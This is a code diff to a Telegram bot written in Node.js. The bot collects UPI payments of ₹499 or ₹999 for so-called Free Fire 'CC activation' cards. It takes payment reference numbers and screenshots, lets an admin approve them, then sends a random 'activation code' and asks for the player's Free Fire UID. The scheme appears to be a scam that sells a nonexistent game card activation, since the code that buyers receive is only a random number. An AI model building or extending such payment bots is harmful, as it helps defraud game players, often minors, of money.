@@ -10,20 +10,47 @@ if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
   process.exit(1);
 }
 
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+const bot = new TelegramBot(BOT_TOKEN, {
+  polling: true
+});
 
 const DATA_FILE = "payments.json";
-const WEBSITE = "https://osmsk307-collab.github.io/free-fire-card/";
+const WEBSITE =
+  "https://osmsk307-collab.github.io/free-fire-card/";
+
+const PLANS = {
+  diamond: {
+    name: "DIAMOND CC ACTIVATION",
+    amount: 999
+  },
+
+  gold: {
+    name: "FREE FIRE GOLD CC ACTIVATION",
+    amount: 499
+  }
+};
 
 let payments = [];
 
+
+// ==========================================
+// LOAD DATA
+// ==========================================
+
 if (fs.existsSync(DATA_FILE)) {
   try {
-    payments = JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
+    payments = JSON.parse(
+      fs.readFileSync(DATA_FILE, "utf8")
+    );
   } catch {
     payments = [];
   }
 }
+
+
+// ==========================================
+// SAVE DATA
+// ==========================================
 
 function saveData() {
   fs.writeFileSync(
@@ -32,14 +59,22 @@ function saveData() {
   );
 }
 
-// Generate a new unique 10-digit Reference Number
+
+// ==========================================
+// UNIQUE ACTIVATION CODE
+// ==========================================
+
 function generateCode() {
+
   let code;
 
   do {
+
     code = Math.floor(
-      1000000000 + Math.random() * 9000000000
+      1000000000 +
+      Math.random() * 9000000000
     ).toString();
+
   } while (
     payments.some(
       p => p.activationCode === code
@@ -49,168 +84,365 @@ function generateCode() {
   return code;
 }
 
-function amountFor(plan) {
-  return plan === "diamond" ? 1999 : 999;
-}
-
-function planName(plan) {
-  return plan === "diamond"
-    ? "DIAMOND CARD ACTIVATE"
-    : "FREE FIRE GOLD CARD ACTIVATE";
-}
-
 
 // ==========================================
-// USER PAYMENT START
+// START
 // ==========================================
 
 bot.onText(
   /^\/start(?:\s+(.+))?$/,
   async (msg, match) => {
 
-    const chatId = msg.chat.id;
-    const payload =
-      match && match[1]
-        ? match[1]
-        : "";
+    try {
 
-    if (!payload) {
-      return bot.sendMessage(
-        chatId,
-        "💳 CARD PAYMENT\n\n" +
-        "Website se payment verification start karo."
-      );
-    }
+      const chatId = msg.chat.id;
 
-    const parts = payload.split("_");
-
-    if (
-      parts.length !== 4 ||
-      parts[0] !== "card"
-    ) {
-      return bot.sendMessage(
-        chatId,
-        "❌ Invalid payment request."
-      );
-    }
-
-    const plan = parts[1];
-    const code = parts[2];
-    const utr = parts[3];
-
-    if (
-      !["diamond", "gold"].includes(plan)
-    ) {
-      return bot.sendMessage(
-        chatId,
-        "❌ Invalid card."
-      );
-    }
-
-    if (!/^\d{10}$/.test(code)) {
-      return bot.sendMessage(
-        chatId,
-        "❌ Activation code must be 10 digits."
-      );
-    }
-
-    if (!/^\d{12}$/.test(utr)) {
-      return bot.sendMessage(
-        chatId,
-        "❌ UTR must be 12 digits."
-      );
-    }
-
-    const amount = amountFor(plan);
-
-    const payment = {
-      id: Date.now().toString(),
-
-      userId: chatId,
-
-      username:
-        msg.from.username || "",
-
-      firstName:
-        msg.from.first_name || "",
-
-      plan,
-
-      planName:
-        planName(plan),
-
-      amount,
-
-      enteredCode: code,
-
-      utr,
-
-      activationCode: null,
-
-      status: "PENDING",
-
-      createdAt:
-        new Date().toISOString()
-    };
-
-    payments.push(payment);
-    saveData();
+      const payload =
+        match && match[1]
+          ? match[1]
+          : "";
 
 
-    // USER PAYMENT RECEIVED
-    await bot.sendMessage(
-      chatId,
+      // --------------------------------------
+      // NO PAYLOAD
+      // --------------------------------------
 
-      `⏳ PAYMENT RECEIVED\n\n` +
+      if (!payload) {
 
-      `📦 Card: ${payment.planName}\n` +
-      `💵 Amount: ₹${amount}\n` +
-      `🔢 UTR: ${utr}\n\n` +
+        return bot.sendMessage(
+          chatId,
 
-      `Your payment is waiting for admin approval.`
-    );
+          `💳 CC ACTIVATION\n\n` +
+          `Please open the activation website first.\n\n` +
+          `${WEBSITE}`
+        );
 
-
-    // ADMIN PAYMENT MESSAGE
-    await bot.sendMessage(
-      ADMIN_CHAT_ID,
-
-      `💰 NEW PAYMENT\n\n` +
-
-      `👤 User: ${payment.firstName}\n` +
-      `🆔 Chat ID: ${chatId}\n` +
-
-      `📦 Card: ${payment.planName}\n` +
-      `💵 Amount: ₹${amount}\n` +
-
-      `🔢 UTR: ${utr}\n` +
-      `🔑 Entered Code: ${code}`,
-
-      {
-        reply_markup: {
-          inline_keyboard: [
-            [
-              {
-                text: "✅ APPROVE",
-                callback_data:
-                  `approve_${payment.id}`
-              },
-              {
-                text: "❌ REJECT",
-                callback_data:
-                  `reject_${payment.id}`
-              }
-            ]
-          ]
-        }
       }
-    );
+
+
+      // --------------------------------------
+      // PAYLOAD
+      // card_diamond_activation_UTR
+      // card_gold_activation_UTR
+      // --------------------------------------
+
+      const parts =
+        payload.split("_");
+
+
+      if (
+        parts.length !== 4 ||
+        parts[0] !== "card" ||
+        parts[2] !== "activation"
+      ) {
+
+        return bot.sendMessage(
+          chatId,
+          "❌ Invalid payment request."
+        );
+
+      }
+
+
+      const plan =
+        parts[1];
+
+      const utr =
+        parts[3];
+
+
+      // --------------------------------------
+      // PLAN
+      // --------------------------------------
+
+      if (!PLANS[plan]) {
+
+        return bot.sendMessage(
+          chatId,
+          "❌ Invalid card selected."
+        );
+
+      }
+
+
+      // --------------------------------------
+      // UTR
+      // --------------------------------------
+
+      if (!/^\d{12}$/.test(utr)) {
+
+        return bot.sendMessage(
+          chatId,
+          "❌ UTR must be exactly 12 digits."
+        );
+
+      }
+
+
+      // --------------------------------------
+      // DUPLICATE UTR
+      // --------------------------------------
+
+      const duplicate =
+        payments.find(
+          p =>
+            p.utr === utr &&
+            p.status !== "REJECTED"
+        );
+
+
+      if (duplicate) {
+
+        return bot.sendMessage(
+          chatId,
+
+          `⚠️ This UTR has already been submitted.\n\n` +
+          `Please use the UTR from your new activation payment.`
+        );
+
+      }
+
+
+      const planData =
+        PLANS[plan];
+
+
+      // --------------------------------------
+      // CREATE PAYMENT
+      // --------------------------------------
+
+      const payment = {
+
+        id:
+          Date.now().toString(),
+
+        userId:
+          chatId,
+
+        username:
+          msg.from.username || "",
+
+        firstName:
+          msg.from.first_name || "",
+
+        plan,
+
+        planName:
+          planData.name,
+
+        amount:
+          planData.amount,
+
+        utr,
+
+        screenshotFileId:
+          null,
+
+        activationCode:
+          null,
+
+        status:
+          "WAITING_SCREENSHOT",
+
+        createdAt:
+          new Date().toISOString(),
+
+        approvedAt:
+          null
+
+      };
+
+
+      payments.push(payment);
+
+      saveData();
+
+
+      // --------------------------------------
+      // ASK USER FOR SCREENSHOT
+      // --------------------------------------
+
+      await bot.sendMessage(
+        chatId,
+
+        `⏳ PAYMENT DETAILS RECEIVED\n\n` +
+
+        `📦 Card: ${payment.planName}\n` +
+        `💵 Amount: ₹${payment.amount}\n` +
+        `🔢 UTR: ${payment.utr}\n\n` +
+
+        `🖼️ NOW SEND PAYMENT SCREENSHOT\n\n` +
+
+        `Apne payment ka screenshot isi chat mein bhejein.\n\n` +
+
+        `Screenshot receive hone ke baad admin verification ke liye submit kiya jayega.`
+      );
+
+    } catch (error) {
+
+      console.error(
+        "Start error:",
+        error
+      );
+
+    }
+
   }
 );
 
 
 // ==========================================
-// ADMIN APPROVE / REJECT
+// SCREENSHOT RECEIVE
+// ==========================================
+
+bot.on(
+  "photo",
+  async (msg) => {
+
+    try {
+
+      const chatId =
+        msg.chat.id;
+
+
+      const payment =
+        payments.find(
+          p =>
+            String(p.userId) === String(chatId) &&
+            p.status === "WAITING_SCREENSHOT"
+        );
+
+
+      if (!payment) {
+
+        return bot.sendMessage(
+          chatId,
+
+          `⚠️ No pending payment found.\n\n` +
+          `Please start from the activation website.`
+        );
+
+      }
+
+
+      const photos =
+        msg.photo || [];
+
+
+      if (!photos.length) {
+        return;
+      }
+
+
+      const photo =
+        photos[photos.length - 1];
+
+
+      payment.screenshotFileId =
+        photo.file_id;
+
+      payment.status =
+        "PENDING";
+
+
+      payment.screenshotReceivedAt =
+        new Date().toISOString();
+
+
+      saveData();
+
+
+      // --------------------------------------
+      // USER CONFIRMATION
+      // --------------------------------------
+
+      await bot.sendMessage(
+        chatId,
+
+        `🖼️ SCREENSHOT RECEIVED ✅\n\n` +
+
+        `📦 ${payment.planName}\n` +
+        `💵 ₹${payment.amount}\n` +
+        `🔢 UTR: ${payment.utr}\n\n` +
+
+        `⏳ Payment is now waiting for admin approval.`
+      );
+
+
+      // --------------------------------------
+      // ADMIN DETAILS
+      // --------------------------------------
+
+      await bot.sendMessage(
+        ADMIN_CHAT_ID,
+
+        `💰 NEW CC ACTIVATION PAYMENT\n\n` +
+
+        `👤 User: ${payment.firstName}\n` +
+        `🆔 Chat ID: ${payment.userId}\n` +
+        `👤 Username: @${payment.username || "N/A"}\n\n` +
+
+        `📦 Card: ${payment.planName}\n` +
+        `💵 Amount: ₹${payment.amount}\n` +
+        `🔢 UTR: ${payment.utr}\n\n` +
+
+        `⏳ Status: PENDING`,
+
+        {
+          reply_markup: {
+            inline_keyboard: [
+              [
+                {
+                  text: "✅ APPROVE",
+                  callback_data:
+                    `approve_${payment.id}`
+                },
+                {
+                  text: "❌ REJECT",
+                  callback_data:
+                    `reject_${payment.id}`
+                }
+              ]
+            ]
+          }
+        }
+      );
+
+
+      // --------------------------------------
+      // ADMIN SCREENSHOT
+      // --------------------------------------
+
+      await bot.sendPhoto(
+        ADMIN_CHAT_ID,
+        payment.screenshotFileId,
+        {
+          caption:
+            `🖼️ PAYMENT SCREENSHOT\n\n` +
+
+            `📦 ${payment.planName}\n` +
+            `💵 Amount: ₹${payment.amount}\n` +
+            `🔢 UTR: ${payment.utr}\n` +
+            `👤 User: ${payment.firstName}\n` +
+            `🆔 Chat ID: ${payment.userId}`
+        }
+      );
+
+    } catch (error) {
+
+      console.error(
+        "Screenshot error:",
+        error
+      );
+
+    }
+
+  }
+);
+
+
+// ==========================================
+// APPROVE / REJECT
 // ==========================================
 
 bot.on(
@@ -226,22 +458,33 @@ bot.on(
         String(query.from.id);
 
 
+      // --------------------------------------
       // ADMIN CHECK
+      // --------------------------------------
+
       if (
         adminId !==
         String(ADMIN_CHAT_ID)
       ) {
+
         return bot.answerCallbackQuery(
           query.id,
           {
             text: "Not authorized"
           }
         );
+
       }
 
 
-      const [action, paymentId] =
+      const parts =
         data.split("_");
+
+      const action =
+        parts[0];
+
+      const paymentId =
+        parts.slice(1).join("_");
 
 
       const payment =
@@ -251,12 +494,15 @@ bot.on(
 
 
       if (!payment) {
+
         return bot.answerCallbackQuery(
           query.id,
           {
-            text: "Payment not found"
+            text:
+              "Payment not found"
           }
         );
+
       }
 
 
@@ -264,12 +510,15 @@ bot.on(
         payment.status !==
         "PENDING"
       ) {
+
         return bot.answerCallbackQuery(
           query.id,
           {
-            text: "Already processed"
+            text:
+              "Already processed"
           }
         );
+
       }
 
 
@@ -279,23 +528,27 @@ bot.on(
 
       if (action === "approve") {
 
-        payment.status =
-          "APPROVED";
-
-
-        // NEW UNIQUE 10-DIGIT CODE
-        const activationCode =
+        const newCode =
           generateCode();
 
 
+        payment.status =
+          "APPROVED";
+
         payment.activationCode =
-          activationCode;
+          newCode;
+
+        payment.approvedAt =
+          new Date().toISOString();
 
 
         saveData();
 
 
-        // USER MESSAGE
+        // ------------------------------------
+        // USER
+        // ------------------------------------
+
         await bot.sendMessage(
           payment.userId,
 
@@ -304,36 +557,36 @@ bot.on(
           `📦 ${payment.planName}\n` +
           `💵 ₹${payment.amount}\n\n` +
 
-          `🎫 YOUR REFERENCE NUMBER\n` +
-          `${activationCode}\n\n` +
+          `🎫 YOUR ACTIVATION CODE\n` +
+          `${newCode}\n\n` +
 
-          `⏳ Your CC activation will start soon.\n` +
-          `Please wait up to 15 minutes.\n\n` +
+          `⚠️ Please save this code safely.\n\n` +
 
-          `🌐 Open Website:\n` +
+          `🌐 Open Activation Website:\n` +
           `${WEBSITE}\n\n` +
 
-          `⚠️ Please save/copy your Reference Number safely.\n` +
-          `You will need this number for the activation process.`
+          `➡️ Next step: Enter your Free Fire UID and continue the activation process.`
         );
 
 
-        // UPDATE ADMIN MESSAGE
+        // ------------------------------------
+        // ADMIN
+        // ------------------------------------
+
         await bot.editMessageText(
 
           `✅ PAYMENT APPROVED\n\n` +
 
           `👤 User: ${payment.firstName}\n` +
+          `🆔 Chat ID: ${payment.userId}\n\n` +
 
           `📦 Card: ${payment.planName}\n` +
-
           `💵 Amount: ₹${payment.amount}\n` +
-
           `🔢 UTR: ${payment.utr}\n\n` +
 
-          `🎫 Reference Number: ${activationCode}\n\n` +
+          `🎫 Activation Code: ${newCode}\n\n` +
 
-          `⏳ CC activation: up to 15 minutes`,
+          `Status: APPROVED`,
 
           {
             chat_id:
@@ -342,6 +595,7 @@ bot.on(
             message_id:
               query.message.message_id
           }
+
         );
 
 
@@ -352,6 +606,7 @@ bot.on(
               "Payment approved"
           }
         );
+
       }
 
 
@@ -368,30 +623,29 @@ bot.on(
         saveData();
 
 
-        // USER MESSAGE
         await bot.sendMessage(
           payment.userId,
 
           `❌ PAYMENT REJECTED\n\n` +
 
-          `Your payment could not be approved.\n\n` +
+          `📦 ${payment.planName}\n\n` +
+
+          `Your activation payment could not be approved.\n\n` +
 
           `Please contact support if you believe this is an error.`
         );
 
 
-        // UPDATE ADMIN MESSAGE
         await bot.editMessageText(
 
           `❌ PAYMENT REJECTED\n\n` +
 
           `👤 User: ${payment.firstName}\n` +
-
           `📦 Card: ${payment.planName}\n` +
-
           `💵 Amount: ₹${payment.amount}\n` +
+          `🔢 UTR: ${payment.utr}\n\n` +
 
-          `🔢 UTR: ${payment.utr}`,
+          `Status: REJECTED`,
 
           {
             chat_id:
@@ -400,6 +654,7 @@ bot.on(
             message_id:
               query.message.message_id
           }
+
         );
 
 
@@ -410,6 +665,7 @@ bot.on(
               "Payment rejected"
           }
         );
+
       }
 
     } catch (error) {
@@ -420,17 +676,18 @@ bot.on(
       );
 
     }
+
   }
 );
 
 
 // ==========================================
-// TELEGRAM POLLING ERROR
+// POLLING ERROR
 // ==========================================
 
 bot.on(
   "polling_error",
-  (error) => {
+  error => {
 
     console.error(
       "Telegram polling error:",
@@ -447,7 +704,6 @@ bot.on(
 
 const PORT =
   process.env.PORT || 10000;
-
 
 http.createServer(
   (req, res) => {
